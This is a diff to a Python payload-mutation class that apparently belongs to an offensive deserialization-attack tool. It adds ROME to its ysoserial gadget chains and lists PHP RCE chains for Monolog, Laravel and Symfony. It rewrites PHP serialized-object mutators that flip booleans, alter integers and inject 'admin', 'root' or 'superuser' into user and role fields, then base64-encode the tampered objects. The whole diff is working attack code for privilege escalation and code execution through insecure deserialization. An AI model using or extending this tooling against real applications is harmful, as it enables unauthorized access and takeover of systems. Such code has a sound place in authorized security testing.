@@ -36,6 +36,9 @@ class PayloadMutation:
             "CommonsCollections6",
             "Spring1",
         ],
+        "Rome": [
+            "ROME",
+        ],
     }
 
     def __init__(self, exploit_result: ExploitResult, vector: MutationVector) -> None:
@@ -117,8 +120,8 @@ class PayloadMutation:
         except subprocess.TimeoutExpired:
             print(f"[!] Timeout: {chain}")
             return None
-        except FileNotFoundError:
-            print("[!] java not found")
+        except (FileNotFoundError, PermissionError, OSError) as e:
+            print(f"[!] Could not run java/ysoserial: {e}")
             return None
 
     def _make_payload(self, ptype: str, chain: str | None, command: str | None, b64: str) -> MutationPayload:
@@ -407,61 +410,133 @@ class PayloadMutation:
         return ["Monolog/RCE1", "Laravel/RCE1", "Symfony/RCE1"]
     
     
+    def _read_php_token(self, payload: str, pos: int) -> dict | None:
+        if pos >= len(payload):
+            return None
+        kind = payload[pos]
+        if kind == 's':
+            m = re.match(r's:(\d+):"', payload[pos:])
+            if not m:
+                return None
+            declared = int(m.group(1))
+            content_start = pos + m.end()
+            content_end = content_start + declared
+            if content_end + 2 > len(payload) or payload[content_end:content_end + 2] != '";':
+                return None
+            return {
+                "start": pos, "end": content_end + 2, "kind": "s",
+                "content": payload[content_start:content_end],
+            }
+        if kind in ("i", "d"):
+            m = re.match(r"[id]:[^;]*;", payload[pos:])
+            if not m:
+                return None
+            return {"start": pos, "end": pos + m.end(), "kind": kind}
+        if kind == "b":
+            m = re.match(r"b:[01];", payload[pos:])
+            if not m:
+                return None
+            return {"start": pos, "end": pos + m.end(), "kind": "b"}
+        if kind == "N":
+            m = re.match(r"N;", payload[pos:])
+            if not m:
+                return None
+            return {"start": pos, "end": pos + m.end(), "kind": "N"}
+        if kind in ("a", "O"):
+            brace = payload.find("{", pos)
+            if brace == -1:
+                return None
+            depth = 1
+            i = brace + 1
+            while i < len(payload) and depth > 0:
+                if payload[i] == "{":
+                    depth += 1
+                elif payload[i] == "}":
+                    depth -= 1
+                i += 1
+            if depth != 0:
+                return None
+            return {"start": pos, "end": i, "kind": kind}
+        return None
+
+    def _iter_php_pairs(self, payload: str) -> list[tuple[dict | None, dict]]:
+        body_start = payload.find("{")
+        if body_start == -1:
+            val_tok = self._read_php_token(payload, 0)
+            return [(None, val_tok)] if val_tok else []
+
+        pos = body_start + 1
+        pairs: list[tuple[dict | None, dict]] = []
+        n = len(payload)
+        while pos < n and payload[pos] != "}":
+            key_tok = self._read_php_token(payload, pos)
+            if key_tok is None:
+                break
+            pos = key_tok["end"]
+            val_tok = self._read_php_token(payload, pos)
+            if val_tok is None:
+                break
+            pos = val_tok["end"]
+            pairs.append((key_tok, val_tok))
+        return pairs
+
     def __flip_boolean(self, payload: str) -> Mutations:
         results: Mutations = []
-        if "b:0" in payload:
-            mutated = payload.replace("b:0", "b:1")
-            encode_mutatedd = base64.b64encode(mutated.encode()).decode()
-            results.append(self._make_payload("flip_boolean", None, None,encode_mutatedd ))
-            
-        if "b:1" in payload:
-            mutated1 = payload.replace("b:1", "b:0")
-            encode_mutatedd1 = base64.b64encode(mutated1.encode()).decode()
-            results.append(self._make_payload("flip_boolean", None, None,encode_mutatedd1 ))
-            
+        for _key_tok, val_tok in self._iter_php_pairs(payload):
+            if val_tok["kind"] != "b":
+                continue
+            flipped = "1" if payload[val_tok["start"] + 2] == "0" else "0"
+            new_token = f"b:{flipped};"
+            mutated = payload[:val_tok["start"]] + new_token + payload[val_tok["end"]:]
+            encode_mutated = base64.b64encode(mutated.encode()).decode()
+            results.append(self._make_payload("flip_boolean", None, None, encode_mutated))
         return results
-    
+
     def __modify_string(self, payload: str) -> Mutations:
         results: Mutations = []
         test_values = ["administrator", "admin", "root", "superuser"]
-        
-        for m in re.finditer(r's:(\d+):"([^"]+)"', payload):
-            declared_len = int(m.group(1))
-            original_val = m.group(2)
+        all_hints = [
+            "username", "user", "email", "login", "name",
+            "role", "admin", "level", "access", "privilege"
+        ]
 
-            all_hints = [
-                "username", "user", "email", "login", "name",
-                "role", "admin", "level", "access", "privilege"
-            ]
-            if not any(hint in payload[max(0, m.start()-20):m.start()].lower()
-                    for hint in all_hints):
+        for key_tok, val_tok in self._iter_php_pairs(payload):
+            if val_tok["kind"] != "s":
+                continue
+            if key_tok is None or key_tok["kind"] != "s":
+                continue
+            if not any(hint in key_tok["content"].lower() for hint in all_hints):
                 continue
 
+            original_val = val_tok["content"]
             for new_val in test_values:
                 if new_val == original_val:
                     continue
-                new_len = len(new_val)
-                new_str = f's:{new_len}:"{new_val}"'
-                mutated = payload.replace(m.group(0), new_str, 1)
+                new_token = f's:{len(new_val)}:"{new_val}";'
+                mutated = payload[:val_tok["start"]] + new_token + payload[val_tok["end"]:]
                 encode_mutated = base64.b64encode(mutated.encode()).decode()
-                results.append(self._make_payload("modify_string", None, None,encode_mutated))
-            
-        
+                results.append(self._make_payload("modify_string", None, None, encode_mutated))
+
         return results
-    
+
     def _mutate_integer(self, payload: str) -> Mutations:
         results: Mutations = []
         int_values = [1, 2, 99, 100, 9999]
 
-        import re
-        for m in re.finditer(r'i:(\d+);', payload):
+        for _key_tok, val_tok in self._iter_php_pairs(payload):
+            if val_tok["kind"] != "i":
+                continue
+            m = re.match(r"i:(-?\d+);", payload[val_tok["start"]:val_tok["end"]])
+            if not m:
+                continue
             original_val = int(m.group(1))
             for new_val in int_values:
                 if new_val == original_val:
                     continue
-                mutated2 = payload.replace(m.group(0), f'i:{new_val};', 1)
-                encode_mutated2 = base64.b64encode(mutated2.encode()).decode()
-                results.append(self._make_payload("modify_integer", None, None,encode_mutated2))
+                new_token = f"i:{new_val};"
+                mutated = payload[:val_tok["start"]] + new_token + payload[val_tok["end"]:]
+                encode_mutated = base64.b64encode(mutated.encode()).decode()
+                results.append(self._make_payload("modify_integer", None, None, encode_mutated))
 
         return results
         
